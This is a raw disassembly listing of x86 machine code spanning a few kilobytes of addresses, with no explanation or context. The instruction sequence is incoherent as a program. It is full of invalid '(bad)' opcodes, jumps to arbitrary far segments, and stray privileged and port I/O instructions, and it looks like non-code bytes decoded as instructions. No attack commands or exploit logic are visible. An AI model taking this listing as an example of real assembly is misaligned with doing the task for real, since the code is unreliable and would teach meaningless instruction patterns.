  421769:	mov    al,BYTE PTR [esi+0x487a6c93]
  42176f:	jo     0x421741
  421771:	mov    dh,0xa8
  421773:	cmp    ebp,DWORD PTR [ebx-0x67]
  421776:	(bad)  
  421777:	clc    
  421778:	imul   ebp,DWORD PTR [ecx-0x30],0xfdd44dca
  42177f:	cs push ds
  421781:	push   eax
  421782:	jmp    0x421772
  421784:	sub    cl,ch
  421786:	les    eax,FWORD PTR [esi-0x41]
  421789:	push   edi
  42178b:	adc    DWORD PTR [edi+edi*1+0x9],edi
  42178f:	jecxz  0x42171f
  421791:	jp     0x421811
  421793:	scas   eax,DWORD PTR es:[edi]
  421794:	pop    es
  421795:	push   cs
  421796:	jmp    0xe548:0xc4b5
  42179c:	xlat   BYTE PTR ds:[ebx]
  42179d:	mov    eax,0x5513d260
  4217a2:	fs pop ds
  4217a4:	es call 0xa721:0x1e64cee5
  4217ac:	js     0x4217f8
  4217ae:	aaa    
  4217af:	fcomi  st,st(2)
  4217b1:	dec    esp
  4217b2:	std    
  4217b3:	push   esi
  4217b4:	into   
  4217b5:	sahf   
  4217b6:	ret    
  4217b7:	int3   
  4217b8:	push   ds
  4217b9:	xor    BYTE PTR [edi+0x1f],ah
  4217bc:	mov    bl,0x57
  4217be:	lds    edi,FWORD PTR [eax-0x5c]
  4217c1:	or     eax,0x55b0b2e2
  4217c6:	mov    edx,0xcf84af36
  4217cb:	cwde   
  4217cc:	xchg   ebp,eax
  4217cd:	mov    bl,0x7a
  4217cf:	adc    DWORD PTR [esi+0x401e1de0],esp
  4217d5:	adc    al,0x59
  4217d7:	sbb    DWORD PTR [edi],edx
  4217d9:	js     0x421780
  4217db:	push   cs
  4217dc:	sbb    al,0xe0
  4217de:	lock cwde 
  4217e0:	int    0x72
  4217e2:	or     eax,0x2a5a55f0
  4217e7:	push   es
  4217e8:	es mov eax,0x5f9b9160
  4217ee:	test   al,0xa2
  4217f0:	mov    ebx,0x849def0d
  4217f5:	sub    al,0x49
  4217f7:	push   ecx
  4217f8:	pop    edx
  4217f9:	mov    BYTE PTR [esi],0xbe
  4217fc:	fstp   DWORD PTR [edi]
  4217fe:	push   ebp
  4217ff:	pop    ebx
  421800:	repnz fadd QWORD PTR ds:0x84766f0d
  421807:	dec    ebp
  421808:	pop    ecx
  421809:	jge    0x42182e
  42180b:	push   edx
  42180c:	or     eax,0xd5e8b23d
  421811:	loope  0x421856
  421813:	push   ss
  421814:	xchg   edi,eax
  421815:	lods   al,BYTE PTR ds:[esi]
  421816:	mov    bl,0x14
  421818:	iret   
  421819:	loop   0x421875
  42181b:	cli    
  42181c:	or     BYTE PTR [ecx+0x16],cl
  42181f:	js     0x421823
  421821:	add    BYTE PTR [edx+eiz*1+0x23c478e5],cl
  421828:	mov    ch,BYTE PTR [edx]
  42182a:	cld    
  42182b:	retf   0x1d56
  42182e:	dec    ebp
  42182f:	rcl    DWORD PTR [ebx+0x56c60392],0x5d
  421836:	and    BYTE PTR [ecx+ecx*1-0x74383290],ch
  42183d:	xchg   edx,eax
  42183e:	or     ch,BYTE PTR [eax-0x5ef6db5c]
  421844:	push   0x9e6ffe19
  421849:	xor    eax,0xf2729e2b
  42184e:	or     eax,DWORD PTR [esi]
  421850:	jns    0x4218c7
  421852:	fdiv   QWORD PTR [esi+0x5a]
  421855:	clc    
  421856:	jns    0x421821
  421858:	pop    ds
  421859:	xchg   ecx,eax
  42185a:	popf   
  42185b:	jae    0x42188d
  42185d:	mov    esp,0x2bd94fa3
  421862:	out    dx,eax
  421863:	xchg   DWORD PTR [ebp-0xb84f08],ebp
  421869:	aas    
  42186a:	enter  0xa692,0xed
  42186e:	mov    edx,0x2036c686
  421873:	in     al,0x39
  421875:	mov    ah,BYTE PTR ds:0x1aef7fcd
  42187b:	fs (bad) 
  42187d:	int    0x27
  42187f:	test   ecx,ebx
  421881:	mov    bh,0x49
  421883:	neg    DWORD PTR [ecx]
  421885:	idiv   DWORD PTR [ebx-0x69f96b35]
  42188b:	out    0x7b,eax
  42188d:	jbe    0x42188a
  42188f:	sbb    BYTE PTR [eax],dh
  421891:	xchg   ebp,eax
  421892:	cmp    esi,DWORD PTR ds:0x59174db6
  421898:	dec    esp
  421899:	in     eax,dx
  42189a:	in     eax,dx
  42189b:	scas   al,BYTE PTR es:[edi]
  42189c:	mov    ecx,0xa0d48103
  4218a1:	or     al,0x6a
  4218a3:	call   0x944fc704
  4218a8:	hlt    
  4218a9:	or     al,0x15
  4218ab:	sub    DWORD PTR [edi+0x54],esi
  4218ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218af:	dec    ecx
  4218b0:	xor    DWORD PTR [esi],0x315b1bd9
  4218b6:	(bad)  
  4218b9:	cmovp  edx,esi
  4218bc:	mov    eax,ds:0x19450873
  4218c1:	jle    0x42189f
  4218c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218c4:	pop    edx
  4218c5:	test   al,0x6
  4218c7:	add    al,0x51
  4218c9:	div    edi
  4218cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218cc:	jno    0x421851
  4218ce:	push   es
  4218cf:	jno    0x4218da
  4218d1:	(bad)  
  4218d2:	mov    edx,0x47d1c734
  4218d7:	les    esi,FWORD PTR [edi+0x38]
  4218da:	xor    DWORD PTR [ebx],ebx
  4218dc:	ret    
  4218dd:	lea    ecx,[esi]
  4218df:	out    dx,al
  4218e0:	aad    0xea
  4218e2:	sbb    al,ch
  4218e4:	mov    al,ds:0xc254b70b
  4218e9:	inc    ebx
  4218ea:	sub    esp,edi
  4218ec:	mov    dh,0x7f
  4218ee:	mov    bh,0xdf
  4218f0:	ja     0x421901
  4218f2:	jb     0x4218cb
  4218f4:	fmul   DWORD PTR [ecx+0x7d110aa4]
  4218fa:	retf   
  4218fb:	lock icebp 
  4218fd:	mov    bh,0x58
  4218ff:	shl    DWORD PTR ds:[ebx-0x3d],cl
  421903:	mov    ebp,0x273da8c1
  421908:	xlat   BYTE PTR ds:[ebx]
  421909:	pop    es
  42190a:	retf   0xe31f
  42190d:	test   al,0x1b
	...
  421917:	add    BYTE PTR [eax],al
  421919:	add    BYTE PTR [eax-0x4456c5cd],dh
  42191f:	test   eax,0x428f3bb3
  421924:	mov    esp,0x2805158a
  421929:	sub    ebp,ebp
  42192b:	xchg   esp,eax
  42192c:	add    DWORD PTR [eax],eax
  42192e:	std    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [ebx-0x60ff0743],ah
  421937:	or     eax,0x7e2f7546
  42193c:	mov    eax,0x2c5f9ee3
  421941:	jnp    0x421993
  421943:	cld    
  421944:	fst    QWORD PTR [edi+0x479eb023]
  42194a:	jno    0x421983
  42194c:	mov    ah,0x5b
  42194e:	mov    es,WORD PTR [ebp+0x6d6e3621]
  421954:	(bad)  
  421955:	shl    DWORD PTR [ecx],cl
  421957:	retf   0x3d8b
  42195a:	dec    ebx
  42195b:	jecxz  0x421945
  42195d:	popa   
  42195e:	scas   al,BYTE PTR es:[edi]
  42195f:	sbb    BYTE PTR [ecx+0x7d4f43b0],bh
  421965:	fist   DWORD PTR [esi]
  421967:	ss pop ds
  421969:	call   0xd012:0xaf653bfc
  421970:	push   esi
  421971:	push   edi
  421972:	mov    gs,WORD PTR cs:[esp+ecx*8]
  421976:	lods   al,BYTE PTR ds:[esi]
  421977:	push   ss
  421978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421979:	xchg   esi,eax
  42197a:	xchg   esi,eax
  42197b:	retf   
  42197c:	sub    al,0x93
  42197e:	lock jne 0x42196c
  421981:	jp     0x4219d0
  421983:	mov    edi,0x7336bccb
  421988:	mov    al,ds:0x18baf688
  42198d:	sbb    al,0x6c
  42198f:	cmp    BYTE PTR [ecx-0x1b],dl
  421992:	int    0xbd
  421994:	mov    eax,0x9f9b2453
  421999:	fs je  0x4219e4
  42199c:	mov    eax,DWORD PTR ds:0xcc54ddd5
  4219a2:	aam    0x15
  4219a4:	mov    bl,dh
  4219a6:	mov    dl,0xa4
  4219a8:	ss jl  0x421965
  4219ab:	outs   dx,DWORD PTR ds:[esi]
  4219ac:	(bad)  
  4219ad:	jns    0x421979
  4219af:	jle    0x4219e3
  4219b1:	fdivp  st(5),st
  4219b3:	ret    0xb31d
  4219b6:	inc    ecx
  4219b7:	inc    ecx
  4219b8:	fnsave [ebp+edx*8+0x9]
  4219bc:	icebp  
  4219bd:	in     eax,0x0
  4219bf:	daa    
  4219c0:	cmp    al,0x8c
  4219c2:	js     0x42195b
  4219c4:	pop    es
  4219c5:	xchg   esi,eax
  4219c6:	jb     0x4219db
  4219c8:	adc    DWORD PTR [edx+0x46df42af],0xffffffd7
  4219cf:	nop
  4219d0:	loope  0x4219b8
  4219d2:	loop   0x4219e9
  4219d4:	pop    es
  4219d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219d6:	adc    edi,DWORD PTR [ebp-0x2d7ced60]
  4219dc:	pop    ebp
  4219dd:	hlt    
  4219de:	rol    BYTE PTR gs:[edx-0x3d],0x47
  4219e3:	and    edx,eax
  4219e5:	and    DWORD PTR [esi+0x3e916ed1],0xd6d12f24
  4219ef:	sbb    ecx,DWORD PTR [edi+eax*2]
  4219f2:	leave  
  4219f3:	fld    QWORD PTR [ecx+eiz*4]
  4219f6:	mov    eax,0x2b3261db
  4219fb:	out    dx,eax
  4219fc:	sbb    ah,BYTE PTR [ecx]
  4219fe:	pop    ecx
  4219ff:	daa    
  421a00:	mov    ds:0xe943bfb4,al
  421a05:	jmp    0x12b9da08
  421a0a:	js     0x42198d
  421a0c:	xchg   bl,ah
  421a0e:	and    cl,BYTE PTR [ecx+0xa36df95]
  421a14:	mov    eax,0xfb4a7943
  421a19:	adc    al,0x2a
  421a1b:	mov    ah,0xc
  421a1d:	mov    al,0x6d
  421a1f:	or     BYTE PTR [esi+0x42771830],bh
  421a25:	mov    esp,0xcf3ecdb9
  421a2a:	gs dec edx
  421a2c:	push   ecx
  421a2d:	fdiv   DWORD PTR [eax]
  421a2f:	inc    eax
  421a30:	mov    bh,0x21
  421a32:	xchg   edi,eax
  421a33:	sbb    edx,DWORD PTR [edi-0x27]
  421a36:	div    BYTE PTR [ecx-0xc]
  421a39:	pop    esp
  421a3a:	std    
  421a3b:	jne    0x4219fb
  421a3d:	std    
  421a3e:	(bad)  
  421a3f:	xchg   ebx,eax
  421a40:	inc    ebp
  421a41:	xor    eax,0xf2e73e71
  421a46:	dec    esp
  421a47:	and    eax,0x2f3df425
  421a4c:	scas   eax,DWORD PTR es:[edi]
  421a4d:	or     eax,0x65ec8a1b
  421a52:	popf   
  421a53:	pop    es
  421a54:	adc    edi,esi
  421a56:	dec    esi
  421a57:	inc    ebx
  421a58:	stc    
  421a59:	push   0x9bef03be
  421a5e:	mov    dl,0x13
  421a60:	pop    edi
  421a61:	scas   al,BYTE PTR es:[edi]
  421a62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a63:	ret    0x782
  421a66:	hlt    
  421a67:	aad    0x68
  421a69:	fidiv  DWORD PTR [esi-0x667aa7f5]
  421a6f:	adc    ebp,esp
  421a71:	in     al,0xe9
  421a73:	mov    esi,0x63acf906
  421a78:	mov    esp,0xea564ca9
  421a7d:	cli    
  421a7e:	fld    QWORD PTR [ecx]
  421a80:	je     0x421ad8
  421a82:	push   ebx
  421a83:	xchg   esp,eax
  421a84:	imul   edx,DWORD PTR [ecx],0x6d26ac59
  421a8a:	push   eax
  421a8b:	retf   
  421a8c:	mov    ebp,DWORD PTR [ebx]
  421a8e:	mov    dh,0x58
  421a90:	xchg   ecx,eax
  421a91:	(bad)  [ebp-0x49]
  421a94:	stc    
  421a95:	lahf   
  421a96:	mov    ds:0xf36d88ec,eax
  421a9b:	sub    al,0x9b
  421a9d:	pop    ds
  421a9e:	ja     0x421a37
  421aa0:	scas   al,BYTE PTR es:[edi]
  421aa1:	cmp    BYTE PTR [eax],dh
  421aa3:	sar    BYTE PTR [ebp+eiz*8-0x4e5d257c],cl
  421aaa:	mov    ebp,eax
  421aac:	cmp    eax,0xb88e0286
  421ab1:	inc    edx
  421ab2:	pushf  
  421ab3:	psubsw mm0,QWORD PTR [ebx]
  421ab6:	hlt    
  421ab7:	call   0x9e2d:0x5d8353a9
  421abe:	mov    ah,0xe7
  421ac0:	xchg   esi,eax
  421ac1:	test   BYTE PTR [eax+0x21],cl
  421ac4:	sar    DWORD PTR [esi-0x48d8030a],1
  421aca:	adc    al,0x59
  421acc:	jb     0x421b1c
  421ace:	pop    ecx
  421acf:	pop    eax
  421ad0:	jp     0x421abc
  421ad2:	call   0x325ac2f3
  421ad7:	scas   eax,DWORD PTR es:[edi]
  421ad8:	outs   dx,DWORD PTR ds:[esi]
  421ad9:	mov    esp,0xaf3fcaa0
  421ade:	fdivr  DWORD PTR [esi+0x33c03848]
  421ae4:	cdq    
  421ae5:	(bad)  
  421ae6:	shl    bh,1
  421ae8:	test   eax,0x2efd3fba
  421aed:	loopne 0x421aff
  421aef:	sbb    WORD PTR [edi-0x421afa5c],ax
  421af6:	and    cl,BYTE PTR [edx]
  421af8:	and    ecx,esi
  421afa:	add    dh,BYTE PTR [ebx+0xd]
  421afd:	in     eax,dx
  421afe:	into   
  421aff:	mov    al,0x42
  421b01:	addr16 call 0x946b37e6
  421b07:	cmp    DWORD PTR [edi+ebx*8+0x35],ebx
  421b0b:	xor    BYTE PTR [eax-0x6c],0x59
  421b0f:	dec    eax
  421b10:	pop    es
  421b11:	call   0xe2fa2340
  421b16:	add    edx,DWORD PTR [edi]
  421b18:	cmp    BYTE PTR [edx],ah
  421b1a:	jne    0x421b8a
  421b1c:	mov    dl,0xc7
  421b1e:	jae    0x421b7d
  421b20:	sbb    eax,0x7d2afc4a
  421b25:	jge    0x421b85
  421b27:	rol    DWORD PTR [edi+0x3d25cd25],1
  421b2d:	and    esp,esp
	...
  421b37:	add    BYTE PTR [eax],al
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0x315df8f7
  421b48:	fisttp QWORD PTR [ebp+0x196ea]
  421b4e:	std    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    BYTE PTR [ebp-0x42],bh
  421b54:	(bad)  
  421b55:	test   BYTE PTR [edx+0x6018ee62],0xd9
  421b5c:	lock jmp 0x6ccde79a
  421b62:	aaa    
  421b63:	nop
  421b64:	outs   dx,BYTE PTR ds:[esi]
  421b65:	mov    ds:0xd0f81cc,eax
  421b6a:	dec    ebx
  421b6b:	cmp    al,0x90
  421b6d:	xchg   esi,eax
  421b6e:	mov    eax,ds:0xa77fac10
  421b73:	stos   DWORD PTR es:[edi],eax
  421b74:	inc    esp
  421b75:	ja     0x421b90
  421b77:	popf   
  421b78:	inc    esi
  421b79:	(bad)  
  421b7b:	add    eax,0xbaa454db
  421b80:	mov    esi,0xb7319474
  421b85:	stc    
  421b86:	div    DWORD PTR [esi+esi*2]
  421b89:	inc    ebx
  421b8a:	js     0x421bc2
  421b8c:	jo     0x421bde
  421b8e:	fs enterw 0x7d96,0xe1
  421b94:	sahf   
  421b95:	jns    0x421b30
  421b97:	imul   ebx,ebp,0xffffffee
  421b9a:	jle    0x421bc3
  421b9c:	sar    BYTE PTR [eax-0x708e8960],0x82
  421ba3:	ss jmp 0x73c5032c
  421ba9:	cdq    
  421baa:	leave  
  421bab:	mov    esi,0xc3816784
  421bb0:	out    0xa9,al
  421bb2:	stos   DWORD PTR es:[edi],eax
  421bb3:	push   cs
  421bb4:	(bad)  
  421bb5:	ins    BYTE PTR es:[edi],dx
  421bb6:	ret    
  421bb7:	xchg   DWORD PTR [esi+0x31],eax
  421bba:	ret    
  421bbb:	push   ebp
  421bbc:	(bad)  [ecx+0x1731cab7]
  421bc2:	out    0x28,eax
  421bc4:	push   0xbd37f2b8
  421bc9:	int3   
  421bca:	dec    ebx
  421bcb:	xor    BYTE PTR [eax+eax*8+0x16],bh
  421bcf:	outs   dx,DWORD PTR ds:[esi]
  421bd0:	mov    edx,gs
  421bd2:	adc    al,0x71
  421bd4:	dec    eax
  421bd5:	jbe    0x421c07
  421bd7:	and    eax,0xfcdf64f5
  421bdc:	jp     0x421c0f
  421bde:	fsubr  st(7),st
  421be0:	and    DWORD PTR [edi],esi
  421be2:	repnz xchg ebx,eax
  421be4:	sub    al,0x4b
  421be6:	in     al,0xf
  421be8:	out    dx,al
  421be9:	inc    edi
  421bea:	push   edx
  421beb:	(bad)  
  421bec:	mov    ch,0xdf
  421bee:	sub    al,bh
  421bf0:	ins    DWORD PTR es:[edi],dx
  421bf1:	ins    DWORD PTR es:[edi],dx
  421bf2:	pop    ecx
  421bf3:	sar    edx,0xf1
  421bf6:	popa   
  421bf7:	into   
  421bf8:	mov    dh,0xa4
  421bfa:	dec    edi
  421bfb:	fs out dx,al
  421bfd:	jb     0x421c0b
  421bff:	out    dx,eax
  421c00:	lods   eax,DWORD PTR ds:[esi]
  421c01:	loopne 0x421c73
  421c03:	mov    cl,0x4
  421c05:	je     0x421bd8
  421c07:	cwde   
  421c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c09:	sub    DWORD PTR gs:[edx*2-0x78122793],eax
  421c11:	xchg   esp,eax
  421c12:	push   ds
  421c13:	nop
  421c14:	(bad)  
  421c15:	aas    
  421c16:	jl     0x421bad
  421c18:	int3   
  421c19:	mov    ds:0xb08f083b,al
  421c1e:	scas   eax,DWORD PTR es:[edi]
  421c1f:	dec    ecx
  421c20:	pushf  
  421c21:	and    ecx,ebp
  421c23:	daa    
  421c24:	imul   ebp,DWORD PTR [edi+0x793e781a],0x95f091c4
  421c2e:	gs dec esp
  421c30:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c32:	cmp    ecx,DWORD PTR [ebx-0x37]
  421c35:	and    ah,BYTE PTR [ebx]
  421c37:	and    BYTE PTR [ebp+0x608eb0d0],dl
  421c3d:	push   ds
  421c3e:	push   edx
  421c3f:	pop    ds
  421c40:	(bad)  
  421c41:	mov    bh,0x2d
  421c43:	ins    BYTE PTR es:[edi],dx
  421c44:	xchg   edx,eax
  421c45:	pop    ecx
  421c46:	adc    al,BYTE PTR [edi]
  421c48:	imul   esi,eax,0x25
  421c4b:	xchg   esi,eax
  421c4c:	xchg   DWORD PTR [ecx-0x704c611f],ecx
  421c52:	jb     0x421cb0
  421c54:	imul   ebx,DWORD PTR [edi+eiz*1-0x6c6e5c00],0xbbdc5998
  421c5f:	dec    ebx
  421c60:	sub    DWORD PTR [edi-0x10],0xffffffdf
  421c64:	adc    esp,ebx
  421c66:	fadd   QWORD PTR [esi+0x79a6d094]
  421c6c:	sub    al,0x10
  421c6e:	lea    edi,[ebx]
  421c70:	sbb    eax,DWORD PTR [esp+edx*2]
  421c73:	pop    esi
  421c74:	test   BYTE PTR [edx+0x3e],al
  421c77:	mov    ecx,0xd49de544
  421c7c:	xchg   ebp,eax
  421c7d:	addr16 sub ecx,edx
  421c80:	neg    bh
  421c82:	iret   
  421c83:	add    al,0x2d
  421c85:	js     0x421c4a
  421c87:	test   ebp,esi
  421c89:	cmp    edi,DWORD PTR [esi+edi*2]
  421c8c:	pop    ebx
  421c8d:	inc    ebp
  421c8e:	xchg   BYTE PTR [esi+edx*2],dl
  421c91:	pushf  
  421c92:	cmc    
  421c93:	loopne 0x421c86
  421c95:	or     DWORD PTR [ebp-0x12],ebp
  421c98:	fcmovnb st,st(7)
  421c9a:	push   edi
  421c9b:	inc    esi
  421c9c:	jle    0x421cb4
  421c9e:	sub    eax,DWORD PTR [ecx-0x1e65f295]
  421ca4:	ja     0x421c2b
  421ca6:	or     dl,BYTE PTR [edx+0xa]
  421ca9:	and    bl,BYTE PTR [edx-0x30]
  421cac:	xlat   BYTE PTR ds:[ebx]
  421cad:	js     0x421ce1
  421caf:	pop    es
  421cb0:	mov    bh,0x4d
  421cb2:	mov    ch,0x4
  421cb4:	sub    ch,BYTE PTR [ecx]
  421cb6:	cmp    BYTE PTR [ecx+0x4],al
  421cb9:	cmp    eax,0x441a5d09
  421cbe:	rol    BYTE PTR [ecx-0x154d50ca],1
  421cc4:	hlt    
  421cc5:	xchg   edx,eax
  421cc6:	xor    eax,0x691f082d
  421ccb:	jp     0x421c9e
  421ccd:	mov    ch,0x7
  421ccf:	adc    al,0x91
  421cd1:	ret    0xcc1
  421cd4:	xchg   edx,eax
  421cd5:	or     BYTE PTR [eax-0x737044e2],0x4d
  421cdc:	mov    eax,0x1660b5cf
  421ce1:	ltr    WORD PTR [ebx-0x29]
  421ce5:	adc    edi,ebx
  421ce7:	imul   ebp,DWORD PTR [ecx+0x7a],0x74
  421ceb:	jne    0x421d35
  421ced:	inc    edx
  421cee:	push   cs
  421cef:	inc    eax
  421cf0:	out    0x31,al
  421cf2:	mov    ah,0x6
  421cf4:	sub    DWORD PTR [ecx],edx
  421cf6:	data16 jge 0x421cf1
  421cf9:	aad    0x8f
  421cfb:	add    bl,dl
  421cfd:	push   esi
  421cfe:	cmp    cl,BYTE PTR [eax-0x1cce8e54]
  421d04:	rol    BYTE PTR [ebx],1
  421d06:	jmp    0xed6f6990
  421d0b:	in     al,dx
  421d0c:	xchg   esp,eax
  421d0d:	in     eax,0x86
  421d0f:	pop    ds
  421d10:	dec    esi
  421d11:	sub    bh,BYTE PTR ds:0xc2e42945
  421d17:	dec    eax
  421d18:	jbe    0x421d37
  421d1a:	or     ecx,DWORD PTR [ecx+0x5990baa6]
  421d20:	add    ecx,DWORD PTR [edi+0x1119b843]
  421d26:	or     BYTE PTR [edi+0x686166e5],0x2d
  421d2d:	push   edi
  421d2e:	dec    esp
  421d2f:	jns    0x421d28
  421d31:	inc    esp
  421d32:	es or  eax,0x61eddb02
  421d38:	push   edi
  421d39:	mov    ebp,edx
  421d3b:	and    DWORD PTR [eax],edi
  421d3d:	jmp    0x421db3
  421d3f:	push   esi
  421d40:	push   es
  421d41:	add    DWORD PTR [edi+0x77],eax
  421d44:	xor    eax,0x449e02a
  421d49:	push   esi
  421d4a:	mov    ebx,0x9636a4a7
	...
  421d57:	add    BYTE PTR [eax],al
  421d59:	add    BYTE PTR [ebx+0x7d7539cf],bh
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	xchg   edx,eax
  421d67:	es mov esp,0x198e7ae
  421d6d:	add    ch,bh
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    bl,ch
  421d73:	xchg   esi,eax
  421d74:	ret    
  421d75:	icebp  
  421d76:	push   ebp
  421d77:	loope  0x421d34
  421d79:	shl    DWORD PTR [eax-0x298b5594],cl
  421d7f:	fwait
  421d80:	cmp    bl,dl
  421d82:	push   edx
  421d83:	push   ebx
  421d84:	es mov ebx,0x350fe072
  421d8a:	or     eax,0xfbb70c30
  421d8f:	push   eax
  421d90:	jbe    0x421d2b
  421d92:	xchg   edx,eax
  421d93:	mov    DWORD PTR [ebp+0x6],eax
  421d96:	in     eax,dx
  421d97:	add    ch,bh
  421d99:	(bad)  
  421d9a:	push   edx
  421d9b:	repnz lock stos DWORD PTR es:[edi],eax
  421d9e:	fadd   DWORD PTR ds:0x10fadbbc
  421da4:	mov    ds:0xbd6ec0ce,al
  421da9:	retf   0xa3c9
  421dac:	mov    dl,bh
  421dae:	stc    
  421daf:	push   edx
  421db0:	xor    al,0x22
  421db2:	and    BYTE PTR [ecx-0x44],cl
  421db5:	js     0x421d5d
  421db7:	les    esi,FWORD PTR [edx+0xabf19b4]
  421dbd:	xor    eax,0x85b9b8d4
  421dc2:	mov    dh,0x27
  421dc4:	or     eax,esi
  421dc6:	push   0xbfceafba
  421dcb:	mov    ch,BYTE PTR [edx-0x34f73923]
  421dd1:	pushf  
  421dd2:	call   0xa44d:0x46dbe82f
  421dd9:	inc    esp
  421dda:	in     al,0xa5
  421ddc:	daa    
  421ddd:	xor    al,0x88
  421ddf:	sti    
  421de0:	outs   dx,DWORD PTR ds:[esi]
  421de1:	sub    al,0xb8
  421de3:	pop    edi
  421de4:	fimul  WORD PTR ds:0x47e266d9
  421dea:	aam    0xf9
  421dec:	push   es
  421ded:	data16 or BYTE PTR [ecx-0x4ebdd05b],bh
  421df4:	inc    ecx
  421df5:	jg     0x421e00
  421df7:	dec    ebx
  421df8:	xor    al,0xe9
  421dfa:	fist   DWORD PTR [ecx]
  421dfc:	stos   DWORD PTR es:[edi],eax
  421dfd:	out    dx,al
  421dfe:	and    DWORD PTR es:[eax-0xf],ebx
  421e02:	(bad)  
  421e03:	outs   dx,DWORD PTR ds:[esi]
  421e04:	popa   
  421e05:	and    ch,al
  421e07:	and    esi,DWORD PTR [edx+eiz*8]
  421e0a:	loope  0x421e28
  421e0c:	add    dl,dl
  421e0e:	or     al,0x23
  421e10:	mov    esp,0x26cbe45c
  421e15:	ror    edx,cl
  421e17:	add    dl,ch
  421e19:	dec    edi
  421e1a:	xlat   BYTE PTR ds:[ebx]
  421e1b:	mov    edx,0x65263262
  421e20:	pop    ebx
  421e21:	mov    ds:0xf8fb2739,eax
  421e26:	retf   0xce27
  421e29:	aam    0x8e
  421e2b:	sbb    eax,0x712225de
  421e30:	jo     0x421ea8
  421e32:	ja     0x421eb3
  421e34:	ret    
  421e35:	call   0xe2b2:0xf18deef0
  421e3c:	out    0xdc,al
  421e3e:	add    BYTE PTR [ebx],bl
  421e40:	adc    DWORD PTR [edx+0x4b],esi
  421e43:	fldenv [ebp-0x63c671d5]
  421e49:	xor    BYTE PTR [ebx+0x70774f6],0x48
  421e50:	das    
  421e51:	bound  ebp,QWORD PTR [esi-0x19]
  421e54:	xchg   edi,eax
  421e55:	pusha  
  421e56:	sub    dl,BYTE PTR [eax]
  421e58:	clc    
  421e59:	jnp    0x421dde
  421e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e5c:	push   esp
  421e5d:	pop    ss
  421e5e:	xchg   bh,bl
  421e60:	inc    ebx
  421e61:	pop    edx
  421e62:	nop
  421e63:	xchg   ecx,eax
  421e64:	adc    ebx,DWORD PTR [ecx]
  421e66:	adc    ecx,DWORD PTR ds:0xf24af273
  421e6c:	cmc    
  421e6d:	push   edi
  421e6e:	ja     0x421ec4
  421e70:	leave  
  421e71:	and    DWORD PTR [edx-0x497bf457],ebp
  421e77:	xchg   ecx,eax
  421e78:	clc    
  421e79:	xchg   esp,eax
  421e7a:	ret    0x3a47
  421e7d:	xor    ebx,edx
  421e7f:	bound  esi,QWORD PTR [ecx+0x3e]
  421e82:	adc    BYTE PTR [esp+esi*1+0x6d],ah
  421e86:	pop    es
  421e87:	cmc    
  421e88:	retf   0x5a1c
  421e8b:	mov    ch,0x15
  421e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e8e:	dec    esp
  421e8f:	cmp    al,0xa1
  421e91:	xchg   esp,eax
  421e92:	push   eax
  421e93:	in     al,dx
  421e94:	xor    bl,ah
  421e96:	adc    al,BYTE PTR [edi-0x10cc62b5]
  421e9c:	inc    edi
  421e9d:	mov    ebx,0x5e0183c5
  421ea2:	dec    esp
  421ea3:	les    eax,FWORD PTR [edi]
  421ea5:	lds    esi,FWORD PTR [ecx-0x955c6cc]
  421eab:	mov    ebp,0x47cccca9
  421eb0:	sbb    esp,DWORD PTR [eax+0x27]
  421eb3:	mov    ds:0xe319f9ca,eax
  421eb8:	inc    ebx
  421eb9:	inc    eax
  421eba:	mov    cl,0xbf
  421ebc:	or     esp,esi
  421ebe:	repz dec ebx
  421ec0:	sub    eax,0x79bb989a
  421ec5:	mov    bl,0xed
  421ec7:	cmp    ch,bh
  421ec9:	dec    esp
  421eca:	lea    ecx,[eax+0x7c]
  421ecd:	adc    BYTE PTR [esi-0x2c],dh
  421ed0:	inc    ecx
  421ed1:	js     0x421f45
  421ed3:	pop    esp
  421ed4:	lahf   
  421ed5:	addr16 cld 
  421ed7:	shl    DWORD PTR [ebx],0xdb
  421eda:	and    ch,BYTE PTR [esi-0x3b]
  421edd:	mov    ds:0x2b7c0a7,eax
  421ee2:	sub    DWORD PTR [ebx-0x35],ebp
  421ee5:	sahf   
  421ee6:	gs or  bh,ch
  421ee9:	call   0x54454c07
  421eee:	pop    ecx
  421eef:	sbb    eax,DWORD PTR [ebp+0x3a]
  421ef2:	mov    dh,0xc8
  421ef4:	mov    ds:0xc536c3f8,eax
  421ef9:	and    eax,0xae967cc
  421efe:	jle    0x421f1a
  421f00:	add    al,0x1e
  421f02:	(bad)  [ecx-0x4b]
  421f05:	push   cs
  421f06:	lock fadd st(4),st
  421f09:	enter  0x5902,0x73
  421f0d:	sub    dh,BYTE PTR [esi-0x15]
  421f10:	rcl    DWORD PTR [edx],cl
  421f12:	mov    esi,0xed6bbaa9
  421f17:	test   eax,0x4967cb54
  421f1c:	loop   0x421f75
  421f1e:	jnp    0x421f9b
  421f20:	mov    bl,0xbd
  421f22:	(bad)  
  421f23:	imul   edx,DWORD PTR [ebx-0x3d],0x4c
  421f27:	daa    
  421f28:	jae    0x421ec9
  421f2a:	mov    edx,0xcb09e0d6
  421f2f:	or     al,0xad
  421f31:	test   bl,dh
  421f33:	ja     0x421f81
  421f35:	mov    esp,0x40a836ed
  421f3a:	repnz fwait
  421f3c:	nop
  421f3d:	push   esi
  421f3e:	loope  0x421f5e
  421f40:	push   ebp
  421f41:	repnz repz adc ebp,esp
  421f45:	xchg   eax,eax
  421f47:	push   ecx
  421f48:	fs pop ebp
  421f4a:	or     ch,dl
  421f4c:	fisub  DWORD PTR [ebp-0x71]
  421f4f:	and    DWORD PTR [eax+0xab933f6],esp
  421f55:	nop
